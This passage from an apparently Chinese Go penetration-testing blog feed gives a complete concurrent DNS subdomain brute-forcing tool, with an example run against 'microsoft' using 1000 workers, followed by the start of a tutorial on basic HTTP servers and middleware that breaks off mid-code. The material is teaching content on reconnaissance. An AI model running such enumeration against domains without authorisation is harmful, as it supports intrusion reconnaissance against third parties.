工人函数</h3><p>我们要实现高并发，需要将工作分配给工人函数。</p><p>我们创建<code>worker()</code>函数，该函数使用三个通道函数，一个用于通知工人是否已经关闭通道，一个用于接受工作通道，一个用于发送结果。该函数还需要一个参数来指定要使用的DNS服务器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;<span class="comment">//在域通道上进行循环</span></span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在引入函数<code>worker()</code>之前，我们需要定义一个名为<code>empty</code>的结构体，当工人完成工作时，进行跟踪记录。</p><p>在有结果的时候，发送到<code>gather</code>通道。 最后，当所有的工作完成的时候，在通道<code>tracker</code>上发送一个空结构体，表示所有工作都已完成。如果不这样做，将会使得处于竞争状态，因为调用者可能在收到结果之前退出。</p><p>之后，我们设置要传递的通道</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br></pre></td></tr></table></figure><h3 id="6-使用-bufio包进行一个文本扫描器"><a href="#6-使用-bufio包进行一个文本扫描器" class="headerlink" title="6. 使用 bufio包进行一个文本扫描器"></a>6. 使用 bufio包进行一个文本扫描器</h3><p>打开文件之后，使用<code>bufio</code>包创建一个新的<code>Scanner</code>，该文本扫描器允许我们一行行的读</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br></pre></td></tr></table></figure><p>我们使用新的文本扫描器从用户提供的<code>wordlist</code>中抓取一行文本，并通过文本和用户提供的域结合在一起，组成信的<code>FQDN</code>,需要将结果发送到<code>fqdns</code>通道，但首先需要启动工人函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-收集和显示结果"><a href="#7-收集和显示结果" class="headerlink" title="7. 收集和显示结果"></a>7. 收集和显示结果</h3><p>首先启动一个匿名的<code>gorountine</code>，它将收集工人的结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过遍历通道<code>gather</code>，可以将接收到的结果，添加到切片<code>result</code>上，由于需要将切片附加到另一个切片上，所以需要<code>...</code>，之后关闭通道。</p><p>剩下的就是关闭通道，并且展现结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br></pre></td></tr></table></figure><p>此时结果尚未呈现给用户，我们需要将其打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br></pre></td></tr></table></figure><h3 id="8-完整程序"><a href="#8-完整程序" class="headerlink" title="8. 完整程序"></a>8. 完整程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;text/tabwriter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;</span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"></span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Note: We could check scanner.Err() here.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-使用"><a href="#9-使用" class="headerlink" title="9. 使用"></a>9. 使用</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run .\main.<span class="keyword">go</span> -domain microsoft -wordlist namelist.txt -c <span class="number">1000</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305110557.png"></p><h2 id="0x02-自己编写DNS服务器"><a href="#0x02-自己编写DNS服务器" class="headerlink" title="0x02 自己编写DNS服务器"></a>0x02 自己编写DNS服务器</h2><h3 id="1-实验环境搭建"><a href="#1-实验环境搭建" class="headerlink" title="1. 实验环境搭建"></a>1. 实验环境搭建</h3><p>在服务器上，这里选择使用<code>ubuntu</code>，安装好<code>docker</code></p><hr><p>先鸽一会，有点难，返回来学习</p>]]></content>
    
    
    <summary type="html">Go渗透测试中对于DNS的利用</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(四)</title>
    <link href="https://h0ld1rs.github.io/posts/13916.html"/>
    <id>https://h0ld1rs.github.io/posts/13916.html</id>
    <published>2022-03-02T03:46:28.000Z</published>
    <updated>2022-03-05T03:16:34.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-四-–HTTP服务器，路由，中间件"><a href="#Go渗透测试笔记-四-–HTTP服务器，路由，中间件" class="headerlink" title="Go渗透测试笔记(四)–HTTP服务器，路由，中间件"></a>Go渗透测试笔记(四)–HTTP服务器，路由，中间件</h1><h2 id="0x00-HTTP服务器基础"><a href="#0x00-HTTP服务器基础" class="headerlink" title="0x00 HTTP服务器基础"></a>0x00 HTTP服务器基础</h2><h3 id="1-构建一个简单的服务器"><a href="#1-构建一个简单的服务器" class="headerlink" title="1. 构建一个简单的服务器"></a>1. 构建一个简单的服务器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r * http.Request)</span></span>&#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Hello %s \n&quot;</span>,r.URL.Query().Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是使用<code>HandleFunc</code>创建一个<code>Handler</code>，然后启动监听器访问即可</p><p>同时在写处理请求的时候，需要两个参数，一个是<code>http.ResponseWriter</code>，用于对请求的写入，另一个是<code>Request</code>类型的指针，它运训我们从传入的请求信息中去读取信息。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302120351.png"></p><blockquote><p>http.HandFunc()是怎么运行的？</p><p>由Go文档可知，处理程序被放置在<code>DefaultServerMux</code>上面，<code>ServerMux</code>是多路复用器(server multiplexer)的简写，它可以处理多模式函数的多个HTTP请求，它使用<code>gorountine</code>执行此操作。</p></blockquote><h3 id="2-构造一个简单路由器"><a href="#2-构造一个简单路由器" class="headerlink" title="2. 构造一个简单路由器"></a>2. 构造一个简单路由器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> router <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *router)</span></span>ServeHTTP(w http.ResponseWriter,req *http.Request)  &#123;</span><br><span class="line"><span class="keyword">switch</span> req.URL.Path &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/a&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /a&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/b&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /b&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/c&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /c&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">http.Error(w,<span class="string">&quot;404 not found&quot;</span>,<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> r router</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重写了<code>ServeHTTP</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302142529.png"></p><h3 id="3-构造一个简单的中间件"><a href="#3-构造一个简单的中间件" class="headerlink" title="3. 构造一个简单的中间件"></a>3. 构造一个简单的中间件</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logger <span class="keyword">struct</span> &#123;</span><br><span class="line">Inner http.Handler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *logger)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request) &#123;</span><br><span class="line">log.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">l.Inner.ServeHTTP(w,r)</span><br><span class="line">log.Println(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Println(w,<span class="string">&quot;Hello\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := http.HandlerFunc(hello)</span><br><span class="line">l := logger&#123;Inner:f&#125;</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;l)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们创建了一个外部程序，该程序在每次请求时都会在服务器上记录一些信息，并调用函数<code>hello()</code>，我们将此日志逻辑包装在函数中。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302150042.png"></p><h3 id="4-使用-gorilla-x2F-mux-包进行路由"><a href="#4-使用-gorilla-x2F-mux-包进行路由" class="headerlink" title="4.使用 gorilla&#x2F;mux 包进行路由"></a>4.使用 gorilla&#x2F;mux 包进行路由</h3><p><code>gorilla/mux</code>是个成熟的第三方路由包，可以基于简单，复杂的模式进行路由。他包含正则表达式，参数匹配，动词匹配及子路由等其他功能</p><p>同时，我们需要先下载<code>gorilla/mux</code>包</p><blockquote><p>go get github.com&#x2F;gorilla&#x2F;mux</p></blockquote><p>现在，开始使用这个路由包，使用<code>mux.NewRouter()</code>创建路由器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := 